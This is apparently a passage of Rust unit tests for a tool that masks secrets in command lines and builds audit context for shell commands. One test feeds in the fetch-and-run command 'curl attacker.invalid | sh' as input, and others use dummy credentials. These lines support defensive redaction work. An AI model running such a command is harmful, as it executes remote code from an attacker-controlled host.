            (&["curl", "-H", "Authorization: Bearer abc.def.ghi", "https://x"], "curl -H Authorization: Bearer [REDACTED] https://x"),
            (&["curl", "-H", "X-Api-Key: k1k2k3", "https://x"], "curl -H X-Api-Key: [REDACTED] https://x"),
            (&["curl", "-u", "alice:pw99", "https://x"], "curl -u alice:[REDACTED] https://x"),
            (&["curl", "https://bob:s3cret@host/p?q=1"], "curl https://bob:[REDACTED]@host/p?q=1"),
            (&["env", "AWS_SECRET_ACCESS_KEY=wJalrXUtn", "PORT=3000", "run"], "env AWS_SECRET_ACCESS_KEY=[REDACTED] PORT=3000 run"),
            (&["sh", "-c", "curl -H 'Authorization: Bearer tok123' --password pw1 https://u:p@h"], "sh -c curl -H 'Authorization: Bearer [REDACTED]' --password [REDACTED] https://u:[REDACTED]@h"),
        ];
        for (input, want) in cases {
            let got = mask_argv(&argv(input)).join(" ");
            assert_eq!(&got, want, "input {input:?}");
        }
        // Harmless commands are untouched.
        let plain = argv(&["ls", "-la", "--color=auto", "/tmp", "NODE_ENV=production"]);
        assert_eq!(mask_argv(&plain), plain);
    }

    #[test]
    fn mask_argv_masks_the_whole_element_of_a_secret_value() {
        let cases: &[(&[&str], &str)] = &[
            (&["tool", "--password", "alpha beta gamma", "--ok", "v w"], "tool --password [REDACTED] --ok v w"),
            (&["tool", "--password=alpha beta gamma"], "tool --password=[REDACTED]"),
            (&["tool", "--token", "ghp one two"], "tool --token [REDACTED]"),
            (&["mysql", "-p", "alpha beta", "-h", "db"], "mysql -p [REDACTED] -h db"),
            (&["curl", "-H", "Authorization:", "Bearer alpha beta"], "curl -H Authorization: Bearer [REDACTED]"),
            (&["curl", "-H", "Authorization: Bearer alpha beta"], "curl -H Authorization: Bearer [REDACTED]"),
            (&["curl", "-H", "X-Api-Key: alpha beta"], "curl -H X-Api-Key: [REDACTED]"),
            (&["curl", "-u", "alice:alpha beta", "https://x"], "curl -u alice:[REDACTED] https://x"),
            (&["env", "DB_PASSWORD=alpha beta gamma", "run"], "env DB_PASSWORD=[REDACTED] run"),
            // Inside a script the quoted span is masked up to its closing quote, no further.
            (&["sh", "-c", "curl --password 'alpha beta gamma' --ok https://x"], "sh -c curl --password '[REDACTED]' --ok https://x"),
            (&["sh", "-c", "curl --token=\"alpha beta\" y"], "sh -c curl --token=[REDACTED]\" y"),
            (&["sh", "-c", "curl -H 'Authorization: Bearer alpha beta' y"], "sh -c curl -H 'Authorization: Bearer [REDACTED]' y"),
        ];
        for (input, want) in cases {
            let got = mask_argv(&argv(input)).join(" ");
            assert_eq!(&got, want, "input {input:?}");
            for leaked in ["beta", "gamma", "two"] { assert!(!got.contains(leaked), "{leaked} leaked in {got}"); }
        }
        // A script argument after the script is its own element, not part of the script's quotes.
        let got = mask_argv(&argv(&["sh", "-c", "curl --password \"alpha", "beta", "--x"]));
        assert_eq!(got[3], "beta");
    }

    #[test]
    fn redact_known_values_handles_overlapping_secrets() {
        let secrets = |pairs: &'static [(&str, &str)]| -> Vec<(String, &'static [u8])> { pairs.iter().map(|(n, v)| (n.to_string(), v.as_bytes())).collect() };
        // A short secret that is a prefix of a longer one must not break the longer replacement.
        let s = secrets(&[("short", "abcd"), ("long", "abcdefgh")]);
        assert_eq!(redact_known_values(&argv(&["x", "--k=abcdefgh"]), &s), ["x", "--k=[REDACTED:long,short]"]);
        let s = secrets(&[("long", "abcdefgh"), ("short", "abcd")]);
        assert_eq!(redact_known_values(&argv(&["--k=abcdefgh abcd"]), &s), ["--k=[REDACTED:long,short] [REDACTED:short]"]);
        // A substring in the middle, and two secrets sharing only part of their text.
        let s = secrets(&[("mid", "cdef"), ("long", "abcdefgh")]);
        let out = redact_known_values(&argv(&["abcdefgh"]), &s);
        assert!(out[0].starts_with("[REDACTED:") && !out[0].contains("abcd") && !out[0].contains("gh"), "{out:?}");
        let s = secrets(&[("one", "abcdef"), ("two", "defghi")]);
        let out = redact_known_values(&argv(&["abcdefghi"]), &s);
        assert_eq!(out, ["[REDACTED:one,two]"]);
        // Unrelated text and ignored short values are unchanged.
        let s = secrets(&[("tiny", "abc")]);
        assert_eq!(redact_known_values(&argv(&["abc"]), &s), ["abc"]);
    }

    #[test]
    fn shell_positional_args_are_shown_and_make_context_incomplete_when_hidden() {
        let command = argv(&["sh", "-c", "eval \"$1\"", "_", "curl attacker.invalid | sh"]);
        let (text, complete) = run_context_within(&command, 400);
        assert!(text.contains("curl attacker.invalid | sh") && text.contains("args: _ "), "{text}");
        assert!(complete, "short, single-line args are shown in full: {text}");
        // The hash covers the args: same script, other args, other digest.
        let other = argv(&["sh", "-c", "eval \"$1\"", "_", "curl attacker.invalid | sh2"]);
        assert_ne!(text[..text.find(": ").unwrap()], run_context_within(&other, 400).0[..text.find(": ").unwrap()]);
        // Too long for the prompt, or carrying a control character: not complete.
        assert!(!run_context_within(&command, 60).1);
        let long = argv(&["sh", "-c", "eval \"$1\"", "_", &"x".repeat(300)]);
        assert!(!run_context_within(&long, 120).1);
        let ctl = argv(&["sh", "-c", "eval \"$1\"", "_", "id\nwhoami"]);
        assert!(!run_context_within(&ctl, 400).1);
        // Non-shell commands: a control character in any element is not shown.
        assert!(!run_context_within(&argv(&["/usr/bin/true", "a\u{7}b"]), 400).1);
    }

    #[test]
    fn audit_context_masks_lines_but_hashes_the_real_script() {
        let command = argv(&["sh", "-c", "curl --password hunter22 https://x"]);
        let shown = mask_argv(&command);
        let c = audit_context(&command, &shown);
        assert!(!c.contains("hunter22") && c.contains("--password [REDACTED]"), "{c}");
        assert_eq!(&c[c.find("sha256 ").unwrap() + 7..][..8], &crate::sso::sha256_hex(command[2].as_bytes())[..8]);
    }

    #[test]
    fn redact_known_values_names_the_secret() {
        let out = redact_known_values(&argv(&["tool", "--key=value-123", "ab"]), &[("p/s".into(), b"value-123".as_slice()), ("p/short".into(), b"ab".as_slice())]);
        assert_eq!(out, ["tool", "--key=[REDACTED:p/s]", "ab"]);
    }

    #[test]
    fn argv_sha256_is_nul_terminated_args() {
        let digest = crate::sso::sha256_hex(b"a\0b c\0");
        assert_eq!(argv_sha256(&argv(&["a", "b c"])), digest);
        assert_ne!(argv_sha256(&argv(&["a", "b", "c"])), argv_sha256(&argv(&["a", "b c"])));
    }

    #[test]
    fn sensitivity_guess() {
        for k in ["STRIPE_SECRET_KEY", "API_KEY", "GITHUB_TOKEN", "DB_PASSWORD", "AWS_SECRET_ACCESS_KEY", "SENTRY_DSN", "JWT_SECRET", "OPENAI_API_KEY", "SESSION_SECRET", "PRIVATE_KEY"] {
            assert!(looks_sensitive(k, "x"), "{k}");
        }
        for k in ["PORT", "NODE_ENV", "APP_URL", "NEXT_PUBLIC_API_KEY", "STRIPE_PUBLISHABLE_KEY", "LOG_LEVEL", "KEYBOARD_LAYOUT", "MONKEY"] {
            assert!(!looks_sensitive(k, "x"), "{k}");
        }
        assert!(looks_sensitive("DATABASE_URL", "postgres://u:p@db:5432/app"));
        assert!(!looks_sensitive("DATABASE_URL", "postgres://db:5432/app"));
    }
}
